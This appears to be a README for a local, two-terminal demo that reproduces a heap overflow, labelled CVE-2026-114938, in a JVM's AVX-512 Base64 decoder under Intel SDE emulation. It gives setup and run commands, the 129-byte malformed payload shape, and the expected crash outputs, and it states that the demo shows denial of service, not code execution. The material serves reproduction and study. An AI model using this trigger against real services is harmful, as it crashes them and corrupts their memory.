# Two-terminal walkthrough: CVE-2026-114938

A guided walkthrough with two terminals: one shows the **target**, the other the
**attacker**. It runs locally with AVX-512 VBMI emulated by Intel SDE, so no cloud
account or special hardware is required.

The trigger primitive is published research (Quang Luong / Calif.io). What this
repository adds is the instrumentation around it: the oracle that derives the
correct trigger length and write window, per-endpoint counters, a victim object
allocated right after the buffer, and automatic `hs_err` capture.

---

## 1. Setup (once)

```bash
./demo/setup-sde.sh
```

The script:

1. downloads Intel SDE 10.13.1 (~37 MB) into `demo/.tools/`;
2. extracts JDK 17.0.21 from the `eclipse-temurin:17.0.21_9-jdk` image (via Docker);
3. compiles the target and the PoCs into `demo/.build/`;
4. confirms that the JVM under SDE reports `UseAVX = 3`.

Requirements: Linux x86-64, `curl`, `tar`, `docker`, `python3`, and `tmux` for the
single-command mode.

## 2. Running

### Option A: one command (tmux)

```bash
./demo/run-demo.sh
```

### Option B: two terminals

```bash
# Terminal 1: target
./demo/target.sh

# Terminal 2: attacker (wait until terminal 1 reports it is up)
./demo/attacker.sh
```

The target listens on `127.0.0.1:8080`. Nothing leaves the machine.

> **Startup time:** under emulation the JVM takes roughly 25-30 seconds to start
> answering requests.

## 3. What to look for

### Target pane (`target.sh`)

| Stage | Expected output |
|---|---|
| Startup | `mode: Intel SDE (AVX-512 VBMI emulated)` |
| Up | A `/health` line with the runtime, e.g. `17.0.21+9` |
| Baseline | `ok` counter increments, `bad` stays the same |
| Trigger | `bad` increments and the process dies |
| Crash | `SIGSEGV` and the captured `hs_err` file |

The `/health` counters show that each request reached the application.

### Attacker pane (`attacker.sh`)

| Stage | Expected output |
|---|---|
| Gate | `AVX-512 VBMI: EMULATED via Intel SDE` |
| Payload | `128x'A' + '=' -> 129 bytes` |
| Baseline | `http=200 {"decoded":48}` |
| Mechanism | `outMask=ffffffffffffffff` |
| Oracle | `[HIT] ... buffer=98 ... tail=[96,159] OOB=62` |
| Trigger | `http=400 ... "victim_len":-1700370022` |
| Result | Target stops responding: the JVM crashed |

## 4. Expected result by environment

| Environment | Outcome |
|---|---|
| Any x86-64 Linux host + SDE | `HIT`, `OOB=62`, JVM crash and `hs_err` |
| Host without AVX-512 and without SDE | Methodology only; no corruption |
| Native AVX-512 VBMI instance | Same `HIT`, no emulation |

## 5. What the walkthrough demonstrates, and what it does not

**Demonstrates:** the application runs the vectorized decoder; a malformed
129-byte Base64 input causes a 64-byte store at `dp=96`, 62 bytes beyond the
98-byte buffer; the neighboring object header is overwritten and the JVM crashes.

**Does not demonstrate:** remote code execution. The written bytes are fixed and
the full chain (writer/reader primitive toward the code cache) is not public. The
accurate description is **reproduced heap corruption with denial of service**.
